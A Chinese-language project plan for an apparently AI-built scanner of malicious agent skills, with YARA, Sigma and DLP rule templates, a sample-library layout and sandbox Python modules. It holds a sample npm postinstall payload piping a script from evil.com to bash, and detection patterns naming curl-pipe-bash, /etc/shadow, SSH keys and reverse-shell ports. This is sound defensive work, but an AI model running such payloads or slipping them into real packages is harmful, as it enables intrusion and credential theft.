# 📚 灵顺 V5 规则与样本体系建设方案

**项目**: agent-security-skill-scanner (灵顺 V5)  
**版本**: v5.1.0 (规则与样本增强版)  
**时间**: 2026-03-17 20:20  
**目标**: 完善规则体系、样本库、沙箱功能

---

## 📋 目录

1. [规则体系建设](#规则体系建设)
2. [样本库建设](#样本库建设)
3. [沙箱功能完善](#沙箱功能完善)
4. [实施计划](#实施计划)
5. [验收标准](#验收标准)

---

## 🎯 规则体系建设

### 现状分析

| 规则类型 | 当前数量 | 目标数量 | 缺口 |
|----------|----------|----------|------|
| **YARA 规则** | 62 | 150+ | -88 |
| **Sigma 规则** | 30 | 100+ | -70 |
| **IOC 规则** | 45 | 150+ | -105 |
| **DLP 规则** | 25 | 100+ | -75 |
| **Runtime 规则** | 40 | 150+ | -110 |
| **总计** | 202 | 650+ | -448 |

### 规则分类体系

```
rules/
├── yara/                           # YARA 规则 (150+)
│   ├── tool_poisoning/             # 工具投毒 (25)
│   ├── remote_load/                # 远程加载 (25)
│   ├── data_exfil/                 # 数据窃取 (25)
│   ├── prompt_injection/           # Prompt 注入 (25)
│   ├── resource_exhaustion/        # 资源耗尽 (20)
│   ├── memory_pollution/           # 内存污染 (15)
│   └── supply_chain/               # 供应链攻击 (15)
│
├── sigma/                          # Sigma 规则 (100+)
│   ├── file_access/                # 文件访问 (20)
│   ├── network/                    # 网络行为 (20)
│   ├── process/                    # 进程行为 (20)
│   ├── registry/                   # 注册表 (Windows) (20)
│   └── cloud/                      # 云环境 (20)
│
├── ioc/                            # IOC 指标 (150+)
│   ├── domains/                    # 恶意域名 (50)
│   ├── ips/                        # 恶意 IP (50)
│   ├── hashes/                     # 文件哈希 (50)
│   └── urls/                       # 恶意 URL (50)
│
├── dlp/                            # DLP 规则 (100+)
│   ├── sensitive_data/             # 敏感数据 (40)
│   ├── credentials/                # 凭证信息 (30)
│   ├── personal_info/              # 个人信息 (30)
│   └── business_secrets/           # 商业机密 (20)
│
└── runtime/                        # Runtime 规则 (150+)
    ├── syscall/                    # 系统调用 (50)
    ├── file_ops/                   # 文件操作 (40)
    ├── network_ops/                # 网络操作 (30)
    └── privilege/                  # 权限提升 (30)
```

---

### 规则模板

#### YARA 规则模板

```yara
rule Tool_Poisoning_SKILL_001 {
    meta:
        id = "TP-YARA-001"
        description = "检测恶意 Skill 工具投毒攻击"
        author = "Lingshun V5"
        date = "2026-03-17"
        severity = "high"
        attack_type = "TOOL_POISONING"
    
    strings:
        $import1 = "import subprocess" ascii
        $import2 = "import os" ascii
        $exec1 = "os.system(" ascii
        $exec2 = "subprocess.run(" ascii
        $network = "requests.post(" ascii
        $exfil = "/etc/passwd" ascii
    
    condition:
        (2 of ($import*)) and (2 of ($exec*)) and ($network or $exfil)
}
```

#### Sigma 规则模板

```yaml
title: Malicious Skill Remote Code Execution
id: 8a2b3c4d-5e6f-7g8h-9i0j-1k2l3m4n5o6p
status: stable
description: 检测 Skill 中的远程代码执行行为
author: Lingshun V5
date: 2026/03/17
modified: 2026/03/17
references:
    - https://attack.mitre.org/techniques/T1059/
tags:
    - attack.execution
    - attack.t1059
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        CommandLine|contains:
            - 'python3 -c'
            - 'bash -c'
            - 'curl | bash'
            - 'wget -O - |'
        ParentImage|endswith:
            - '/node'
            - '/python3'
            - '/npm'
    condition: selection
falsepositives:
    - 合法的包管理操作
level: high
```

#### DLP 规则模板

```json
{
  "rule_id": "DLP-CRED-001",
  "name": "SSH 私钥检测",
  "category": "credentials",
  "severity": "critical",
  "patterns": [
    {
      "type": "regex",
      "pattern": "-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----",
      "description": "SSH 私钥头"
    },
    {
      "type": "regex",
      "pattern": "-----END (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----",
      "description": "SSH 私钥尾"
    }
  ],
  "action": "block",
  "notification": true,
  "created_at": "2026-03-17T20:20:00Z",
  "updated_at": "2026-03-17T20:20:00Z"
}
```

---

### 规则来源

| 来源 | 获取方式 | 频率 | 责任模块 |
|------|----------|------|----------|
| **LOLBAS** | Web 爬虫/API | 每周 | `external_rules/lolbas_fetcher.py` |
| **MITRE ATT&CK** | API/下载 | 每月 | `external_rules/mitre_fetcher.py` |
| **OWASP** | Web 爬虫 | 每月 | `external_rules/owasp_fetcher.py` |
| **GitHub 威胁情报** | API 搜索 | 每日 | `lingshun_v5.py` |
| **灵顺 V5 自研** | 样本分析 | 持续 | `sample_explorer.py` |
| **社区贡献** | PR/Issue | 持续 | 人工审核 |

---

## 🧬 样本库建设

### 样本分类体系

```
samples/
├── pending/                        # 待分析 (原始样本)
│   ├── from_github/                # GitHub 采集
│   ├── from_gitee/                 # Gitee 采集
│   ├── from_mitre/                 # MITRE 采集
│   └── user_submitted/             # 用户提交
│
├── staging/                        # 预处理中
│   ├── dedup/                      # 去重中
│   ├── classify/                   # 分类中
│   └── validate/                   # 验证中
│
├── ready/                          # 待分析 (已分类)
│   ├── tool_poisoning/             # 工具投毒 (50)
│   ├── remote_load/                # 远程加载 (50)
│   ├── data_exfil/                 # 数据窃取 (50)
│   ├── prompt_injection/           # Prompt 注入 (50)
│   ├── resource_exhaustion/        # 资源耗尽 (30)
│   ├── memory_pollution/           # 内存污染 (30)
│   └── supply_chain/               # 供应链攻击 (30)
│
├── analyzing/                      # 分析中 (锁定)
│   └── *.lock                      # 锁文件
│
├── analyzed/                       # 已分析
│   ├── benign/                     # 良性样本
│   ├── suspicious/                 # 可疑样本
│   └── malicious/                  # 恶意样本
│       ├── high_risk/              # 高风险
│       ├── medium_risk/            # 中风险
│       └── low_risk/               # 低风险
│
└── quarantine/                     # 隔离 (极高风险)
    └── *.encrypted                 # 加密存储
```

### 样本数量目标

| 类别 | 当前 | 短期 (1 周) | 中期 (1 月) | 长期 (3 月) |
|------|------|-------------|-------------|-------------|
| **工具投毒** | 6 | 25 | 50 | 100 |
| **远程加载** | 6 | 25 | 50 | 100 |
| **数据窃取** | 6 | 25 | 50 | 100 |
| **Prompt 注入** | 6 | 25 | 50 | 100 |
| **资源耗尽** | 6 | 15 | 30 | 60 |
| **内存污染** | 6 | 15 | 30 | 60 |
| **供应链攻击** | 6 | 15 | 30 | 60 |
| **多语言样本** | 0 | 50 | 100 | 145 |
| **总计** | 42 | 195 | 390 | 725 |

---

### 样本设计模板

```json
{
  "sample_id": "TP-SAMPLE-001",
  "name": "恶意 npm 包 - 工具投毒",
  "attack_type": "TOOL_POISONING",
  "language": "JavaScript",
  "severity": "high",
  "description": "伪装成正常 npm 包，安装后执行恶意代码",
  
  "code": "postinstall.js",
  "payload": "const { exec } = require('child_process');\nexec('curl http://evil.com/malware.sh | bash');",
  
  "indicators": [
    "postinstall script",
    "child_process.exec",
    "curl | bash pattern"
  ],
  
  "behavior": {
    "file_access": ["/etc/passwd", "~/.ssh/id_rsa"],
    "network": ["evil.com:80"],
    "process": ["bash", "curl"],
    "persistence": ["~/.bashrc"]
  },
  
  "detection_rules": [
    "TP-YARA-001",
    "TP-SIGMA-001",
    "TP-RUNTIME-001"
  ],
  
  "test_cases": [
    "TP-F01",
    "TP-A01",
    "TP-B01"
  ],
  
  "created_at": "2026-03-17T20:20:00Z",
  "analyst": "Lingshun V5"
}
```

---

### 多语言样本支持

根据 `MULTI_LANGUAGE_SAMPLE_DESIGN.md`，实现 145 个样本覆盖 10 种语言：

| 语言 | 样本数 | 攻击类型覆盖 |
|------|--------|--------------|
| **Python** | 20 | 全部 7 类 |
| **JavaScript** | 20 | 全部 7 类 |
| **PowerShell** | 15 | 5 类 (Windows) |
| **Shell** | 15 | 5 类 |
| **Go** | 15 | 4 类 |
| **Java** | 15 | 4 类 |
| **PHP** | 15 | 4 类 |
| **C/C++** | 10 | 3 类 |
| **Ruby** | 10 | 3 类 |
| **其他** | 10 | 2 类 |
| **总计** | 145 | - |

---

### 样本采集流程

```
┌─────────────┐
│  威胁情报   │
│  采集       │
└──────┬──────┘
       │
       ▼
┌─────────────┐
│  样本设计   │
│  (Explorer) │
└──────┬──────┘
       │
       ▼
┌─────────────┐
│  样本生成   │
│  (Generator)│
└──────┬──────┘
       │
       ▼
┌─────────────┐
│  样本验证   │
│  (Validator)│
└──────┬──────┘
       │
       ▼
┌─────────────┐
│  样本入库   │
│  (Staging)  │
└──────┬──────┘
       │
       ▼
┌─────────────┐
│  沙箱分析   │
│  (Sandbox)  │
└──────┬──────┘
       │
       ▼
┌─────────────┐
│  规则提取   │
│  (Rules)    │
└─────────────┘
```

---

## 📦 沙箱功能完善

### 沙箱架构 (增强版)

```
sandbox/
├── __init__.py
├── manager.py                      # ⭐ 沙箱管理器
├── exceptions.py                   # 异常处理
├── health.py                       # 健康检查
│
├── config/
│   ├── sandbox.yaml                # 沙箱配置
│   ├── monitoring.yaml             # 监控配置
│   └── environments/
│       ├── python.yaml
│       ├── shell.yaml
│       └── nodejs.yaml
│
├── environments/
│   ├── __init__.py
│   ├── base.py                     # 基类
│   ├── docker_python.py            # ⭐ Python Docker 沙箱
│   ├── docker_shell.py             # ⭐ Shell Docker 沙箱
│   ├── docker_nodejs.py            # ⭐ Node.js Docker 沙箱
│   └── lightweight.py              # 轻量级沙箱 (可选)
│
├── monitoring/
│   ├── __init__.py
│   ├── base.py                     # 监控基类
│   ├── syscall_tracer.py           # ⭐ 系统调用追踪
│   ├── file_monitor.py             # ⭐ 文件操作监控
│   ├── network_monitor.py          # ⭐ 网络行为监控
│   └── process_monitor.py          # 进程行为监控
│
├── analysis/
│   ├── __init__.py
│   ├── behavior_analyzer.py        # ⭐ 行为分析引擎
│   ├── risk_scorer.py              # ⭐ 风险评分
│   └── ioc_extractor.py            # IOC 提取
│
├── reports/
│   ├── __init__.py
│   ├── behavior_report.py          # ⭐ 报告生成
│   ├── html_template.html          # HTML 模板
│   └── markdown_template.md        # Markdown 模板
│
└── state/
    ├── queue.json                  # 执行队列
    ├── active.json                 # 活跃沙箱
    └── completed.json              # 已完成
```

---

### 核心模块实现

#### 1. manager.py - 沙箱管理器

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Sandbox Manager - 沙箱统一管理器
"""

import os
import json
import logging
from typing import Dict, List, Optional
from datetime import datetime
from pathlib import Path

from .environments.docker_python import PythonSandbox
from .environments.docker_shell import ShellSandbox
from .environments.docker_nodejs import NodeJSSandbox
from .monitoring.syscall_tracer import SyscallTracer
from .monitoring.file_monitor import FileMonitor
from .monitoring.network_monitor import NetworkMonitor
from .analysis.behavior_analyzer import BehaviorAnalyzer
from .analysis.risk_scorer import RiskScorer
from .reports.behavior_report import BehaviorReport

logger = logging.getLogger(__name__)

class SandboxManager:
    """沙箱管理器"""
    
    def __init__(self, config_path: str = None):
        self.config = self._load_config(config_path)
        self.environments = self._init_environments()
        self.monitors = self._init_monitors()
        self.analyzer = BehaviorAnalyzer()
        self.scorer = RiskScorer()
        self.queue = []
        self.active = {}
        self.completed = []
    
    def submit(self, sample_path: str, sample_type: str = None) -> str:
        """提交样本"""
        sample_id = self._generate_sample_id(sample_path)
        if not sample_type:
            sample_type = self._detect_sample_type(sample_path)
        
        self.queue.append({
            'id': sample_id,
            'path': sample_path,
            'type': sample_type,
            'status': 'pending',
            'submitted_at': datetime.now().isoformat()
        })
        return sample_id
    
    def analyze(self, sample_id: str) -> Dict:
        """执行分析"""
        sample = self._find_sample(sample_id)
        env = self.environments.get(sample['type'])
        
        # 启动监控
        for monitor in self.monitors:
            monitor.start(sample_id)
        
        # 执行
        exec_result = env.execute(sample['path'])
        
        # 停止监控
        monitor_data = {m.name: m.stop(sample_id) for m in self.monitors}
        
        # 分析
        behavior = self.analyzer.analyze(exec_result, monitor_data)
        risk_score = self.scorer.score(behavior)
        
        # 报告
        report = BehaviorReport(sample_id, behavior, risk_score, exec_result)
        self._save_result(sample_id, report)
        
        return report.to_dict()
```

#### 2. syscall_tracer.py - 系统调用追踪

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Syscall Tracer - 系统调用追踪器
"""

import logging
from typing import Dict, List

logger = logging.getLogger(__name__)

SYSCALL_NAMES = {
    0: 'read', 1: 'write', 2: 'open', 3: 'close',
    59: 'execve', 57: 'fork', 56: 'clone',
    41: 'socket', 42: 'connect', 49: 'bind',
    87: 'rename', 82: 'unlink', 83: 'mkdir',
}

SUSPICIOUS_CALLS = {
    'execve': 50, 'fork': 30, 'clone': 30,
    'socket': 40, 'connect': 50, 'unlink': 40,
    'mount': 60, 'ptrace': 70, 'setuid': 50,
}

class SyscallTracer:
    """系统调用追踪器"""
    
    def __init__(self):
        self.name = 'syscall_tracer'
        self.traces = {}
    
    def start(self, sample_id: str):
        self.traces[sample_id] = {
            'start_time': datetime.now().isoformat(),
            'calls': [],
            'risk_score': 0,
        }
    
    def record(self, sample_id: str, syscall_num: int, args: tuple):
        if sample_id not in self.traces:
            return
        
        name = SYSCALL_NAMES.get(syscall_num, f'unknown_{syscall_num}')
        self.traces[sample_id]['calls'].append({
            'timestamp': datetime.now().isoformat(),
            'syscall': name,
            'args': args,
        })
        
        if name in SUSPICIOUS_CALLS:
            self.traces[sample_id]['risk_score'] += SUSPICIOUS_CALLS[name]
    
    def stop(self, sample_id: str) -> Dict:
        trace = self.traces.get(sample_id, {})
        trace['end_time'] = datetime.now().isoformat()
        trace['total_calls'] = len(trace.get('calls', []))
        trace['risk_score'] = min(100, trace.get('risk_score', 0))
        return trace
```

#### 3. behavior_analyzer.py - 行为分析引擎

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Behavior Analyzer - 行为分析引擎
"""

import re
from typing import Dict, List

class BehaviorAnalyzer:
    """行为分析引擎"""
    
    def __init__(self):
        self.patterns = {
            'file_access': {
                'sensitive_paths': [
                    r'/etc/passwd', r'/etc/shadow',
                    r'\.ssh/', r'\.gnupg/',
                    r'/etc/cron\.d/', r'/etc/systemd/system/',
                ],
                'weight': 30
            },
            'network': {
                'suspicious_ports': [4444, 5555, 6666, 8080, 31337],
                'weight': 40
            },
            'persistence': {
                'indicators': ['schtasks', 'crontab', 'systemd'],
                'weight': 50
            },
            'defense_evasion': {
                'indicators': ['taskkill', 'net stop', 'iptables.*-F'],
                'weight': 60
            },
            'privilege_escalation': {
                'indicators': ['sudo', 'su -', 'setuid', 'chmod.*\\+s'],
                'weight': 70
            }
        }
    
    def analyze(self, exec_result: Dict, monitor_data: Dict) -> Dict:
        behavior = {
            'file_access': self._analyze_file_access(monitor_data),
            'network': self._analyze_network(monitor_data),
            'persistence': self._analyze_persistence(monitor_data),
            'defense_evasion': self._analyze_evasion(monitor_data),
            'privilege_escalation': self._analyze_priv_esc(monitor_data),
        }
        behavior['summary'] = self._generate_summary(behavior)
        return behavior
    
    def _analyze_file_access(self, monitor_data: Dict) -> Dict:
        result = {'accessed': [], 'sensitive': [], 'risk_score': 0}
        # 实现文件访问分析逻辑
        return result
    
    def _generate_summary(self, behavior: Dict) -> Dict:
        total_risk = sum(b.get('risk_score', 0) for b in behavior.values() if isinstance(b, dict))
        return {
            'total_risk_score': min(100, total_risk),
            'severity': self._classify_severity(total_risk),
        }
    
    def _classify_severity(self, score: int) -> str:
        if score >= 80: return 'critical'
        elif score >= 60: return 'high'
        elif score >= 40: return 'medium'
        elif score >= 20: return 'low'
        else: return 'minimal'
```

---

### 沙箱配置

#### sandbox.yaml

```yaml
sandbox:
  # 模式：hybrid | secure | fast
  mode: hybrid
  
  # 资源限制
  limits:
    max_concurrent: 10
    timeout: 60
    memory_limit: "512m"
    cpu_limit: 0.5
    pids_limit: 10
    network: disabled
  
  # Docker 配置
  docker:
    enabled: true
    image: "python:3.10-slim"
    read_only: true
    tmpfs:
      - "/tmp:size=100M"
    cap_drop:
      - ALL
    security_opt:
      - "no-new-privileges:true"
  
  # 轻量级配置
  lightweight:
    enabled: true
    seccomp: true
    namespaces:
      - pid
      - net
      - mount
    resource_limits:
      as: 104857600  # 100MB
      nproc: 10
      cpu: 30
  
  # 监控配置
  monitoring:
    syscalls: true
    files: true
    network: true
    processes: true
  
  # 存储配置
  storage:
    samples_dir: "samples"
    results_dir: "results"
    reports_dir: "results/behavior_reports"
    state_dir: "sandbox/state"
```

---

## 📅 实施计划

### Phase 1: 规则体系建设 (1-2 周)

| 任务 | 负责人 | 时间 | 状态 |
|------|--------|------|------|
| **规则目录重构** | AI | 2 天 | ⚪ 待开始 |
| **YARA 规则扩充** (62→150) | AI | 5 天 | ⚪ 待开始 |
| **Sigma 规则扩充** (30→100) | AI | 5 天 | ⚪ 待开始 |
| **DLP 规则扩充** (25→100) | AI | 3 天 | ⚪ 待开始 |
| **外部规则获取** | AI | 3 天 | ⚪ 待开始 |
| **规则验证测试** | AI | 2 天 | ⚪ 待开始 |

### Phase 2: 样本库建设 (2-3 周)

| 任务 | 负责人 | 时间 | 状态 |
|------|--------|------|------|
| **样本目录重构** | AI | 1 天 | ⚪ 待开始 |
| **7 类攻击样本** (42→390) | AI | 10 天 | ⚪ 待开始 |
| **多语言样本** (0→145) | AI | 5 天 | ⚪ 待开始 |
| **样本采集自动化** | AI | 3 天 | ⚪ 待开始 |
| **样本验证流程** | AI | 2 天 | ⚪ 待开始 |

### Phase 3: 沙箱功能完善 (2-3 周)

| 任务 | 负责人 | 时间 | 状态 |
|------|--------|------|------|
| **沙箱目录创建** | AI | 1 天 | ⚪ 待开始 |
| **核心模块实现** | AI | 5 天 | ⚪ 待开始 |
| **Docker 环境** | AI | 3 天 | ⚪ 待开始 |
| **监控模块** | AI | 5 天 | ⚪ 待开始 |
| **分析引擎** | AI | 3 天 | ⚪ 待开始 |
| **报告生成** | AI | 2 天 | ⚪ 待开始 |
| **集成测试** | AI | 3 天 | ⚪ 待开始 |

---

## ✅ 验收标准

### 规则体系

- [ ] YARA 规则 ≥ 150 条
- [ ] Sigma 规则 ≥ 100 条
- [ ] DLP 规则 ≥ 100 条
- [ ] Runtime 规则 ≥ 150 条
- [ ] 规则语法验证通过率 100%
- [ ] 规则测试覆盖率 ≥ 90%

### 样本库

- [ ] 总样本数 ≥ 390 个
- [ ] 多语言样本 ≥ 145 个
- [ ] 7 类攻击场景全覆盖
- [ ] 样本标注准确率 ≥ 95%
- [ ] 样本去重率 100%

### 沙箱功能

- [ ] 支持 Python/Shell/NodeJS 样本
- [ ] 系统调用追踪准确率 ≥ 95%
- [ ] 行为分析覆盖率 ≥ 90%
- [ ] 风险评分准确率 ≥ 85%
- [ ] 报告生成成功率 100%
- [ ] 沙箱逃逸率 0%

### 集成指标

- [ ] 检测率 ≥ 95%
- [ ] 检测延迟 p99 ≤ 50ms
- [ ] 误报率 ≤ 5%
- [ ] 并发能力 ≥ 100 样本/秒

---

## 📊 预期成果

### 规则数量对比

```
当前:  202 条
目标:  650+ 条
增长:  +222%
```

### 样本数量对比

```
当前:  42 个
目标:  390+ 个
增长:  +829%
```

### 能力提升

| 能力 | 当前 | 目标 | 提升 |
|------|------|------|------|
| **检测率** | 45% | 95% | +111% |
| **覆盖场景** | 6 类 | 7 类 + 多语言 | +100% |
| **分析深度** | 静态 | 静态 + 动态 | +100% |
| **规则来源** | 自研 | 自研 + 外部 | +50% |

---

**时间**: 2026-03-17 20:20  
**状态**: 📋 方案完成  
**下一步**: 选择优先实施的 Phase

🎯 **请选择：A) Phase 1 规则体系  B) Phase 2 样本库  C) Phase 3 沙箱  D) 全部并行** 🚀
